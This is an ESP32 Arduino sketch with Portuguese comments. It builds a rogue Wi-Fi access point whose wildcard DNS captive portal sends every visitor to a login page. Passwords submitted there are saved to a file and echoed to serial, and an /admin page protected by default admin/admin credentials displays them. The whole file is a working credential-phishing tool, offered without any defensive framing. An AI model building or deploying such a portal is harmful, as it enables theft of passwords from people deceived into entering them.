#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include "paginas.h"

const char* ssid = "ESP32-CaptivePortal";
const char* password = "12345678";

const char* admin_username = "admin";
const char* admin_password = "admin";

AsyncWebServer server(80);
DNSServer dnsServer;

void setup()
{
  Serial.begin(115200);
  
  // Iniciar LittleFS
  if (!LittleFS.begin()) {
    Serial.println("Erro ao iniciar o LittleFS");
  }
  Serial.println("LittleFS iniciado com sucesso");

  // Configurar Ponto de Acesso
  WiFi.softAP(ssid, password);
  Serial.println("Ponto de acesso iniciado");
  Serial.print("IP do ponto de acesso: ");
  Serial.println(WiFi.softAPIP());

  // Configurar Captive Portal
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Rota para servir o portal
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", loginPage);
  });

  // Rota para lidar com a submissão do formulário
  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
    if (request->hasParam("password", true)) {
      String password = request->getParam("password", true)->value();
      File file = LittleFS.open("/password.txt", "a");
      Serial.println("Senha: " + password);

      if (file) {
        file.println(password + "\n\r");
        file.close();
        request->send(200, "text/html", "Senha salva com sucesso. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
      } else {
        request->send(500, "text/html", "Erro ao salvar a senha. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
      }
    } else {
      request->send(400, "text/html", "Senha não fornecida. Redirecionando em 3 segundos...<script>setTimeout(function(){ window.location = '/'; }, 3000);</script>");
    }
  });

  // Rota para a página de administração
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!request->authenticate(admin_username, admin_password)) {
      return request->requestAuthentication();
    }
    if (LittleFS.exists("/password.txt")) {
      File file = LittleFS.open("/password.txt", "r");
      if (file) {
        String passwordContent;
        while (file.available()) {
          passwordContent += (char)file.read();
        }
        file.close();
        String html = "<html><body><h1>Conteúdo do Arquivo Salvo</h1><pre>" + passwordContent + "</pre></body></html>";
        request->send(200, "text/html", html);
      } else {
        request->send(500, "text/html", "Erro ao abrir o arquivo.");
      }
    } else {
      request->send(404, "text/html", "Arquivo não encontrado.");
    }
  });

  // Captura todas as outras requisições e redireciona para o portal
  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.begin();
  Serial.println("Servidor HTTP iniciado");
}

void loop()
{
  dnsServer.processNextRequest();
  delay(3);
}
